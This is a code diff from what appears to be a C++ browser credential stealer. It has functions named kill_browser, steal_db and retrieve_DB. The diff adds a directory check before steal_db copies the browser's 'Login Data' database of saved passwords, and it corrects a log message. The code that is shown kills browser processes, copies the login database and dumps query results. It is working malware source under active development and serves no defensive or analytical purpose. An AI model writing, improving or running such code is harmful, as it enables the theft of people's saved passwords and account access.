@@ -18,11 +18,19 @@ void kill_browser(const std::vector<std::string>& browser_process) {
 void steal_db(std::string path) {
     try
     {
-        if (std::filesystem::exists(definitions::browser + "Default\\Login Data.db")) {
-            std::filesystem::remove(definitions::browser + "Default\\Login Data.db");
-            logger::log(logger::success, "Cleaned up leftovers.");
+        //verify the directory even exists.
+        if (!std::filesystem::is_directory(definitions::browser)) {
+            logger::log(logger::error, "Could not identify directory.");
+            return;
         }
-        std::filesystem::copy_file(path, path + ".db");
+        else
+        {
+            if (std::filesystem::exists(definitions::browser + "Default\\Login Data.db")) {
+                std::filesystem::remove(definitions::browser + "Default\\Login Data.db");
+                logger::log(logger::success, "Cleaned up leftovers.");
+            }
+            std::filesystem::copy_file(path, path + ".db");
+        }
     }
     catch (const std::exception& e)
     {
@@ -67,6 +75,6 @@ void retrieve_DB(const std::string& dbname, const std::string& query, const std:
         dumpedDB.close();
     }
     catch (const std::exception& e) {
-        logger::log(logger::error, "An error occurred while querying the database:, %s", e.what());
+        logger::log(logger::error, "An error occurred while querying the database, %s", e.what());
     }
 }
